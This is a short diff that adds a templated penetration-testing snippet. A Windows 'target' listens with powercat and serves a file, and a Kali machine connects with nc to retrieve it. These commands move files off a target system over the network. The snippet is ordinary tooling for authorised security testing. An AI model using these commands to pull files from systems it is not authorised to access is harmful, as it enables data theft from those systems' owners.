@@ -1,0 +1,10 @@
+# description: Windows sends file to Kali; target listens and Kali connects
+# stage: Target PowerShell: listen and send file
+$PORT = $rport
+$FILE = "$file"
+powercat -l -p $PORT -i $FILE -d
+
+# stage: Kali shell: connect and receive file
+RFILE="${file:t}"
+rm -f "$RFILE"
+nc $rhost $rport > "$RFILE"
